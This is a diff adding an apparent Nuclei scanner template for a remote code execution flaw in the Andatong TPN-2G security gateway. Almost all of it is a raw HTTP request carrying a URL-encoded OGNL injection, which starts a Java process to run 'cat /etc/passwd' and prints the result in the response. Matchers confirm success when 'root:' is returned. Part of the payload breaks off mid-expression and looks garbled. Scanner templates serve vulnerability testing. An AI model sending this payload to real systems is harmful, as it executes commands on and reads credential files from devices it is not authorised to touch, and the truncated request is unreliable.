@@ -1,0 +1,24 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'root:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22cat%22,%22/etc/passwd%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22test%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java HTTP/1.1
+          Host: {{Hostname}}
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          Connection: close
+id: andatong-TPN-2G-RCE
+info:
+    author: Superhero
+    description: 安达通 TPN-2G 安全网关存在RCE漏洞
+    name: 安达通 TPN-2G 安全网关 RCE
+    severity: high
+    tags:
+        - RCE
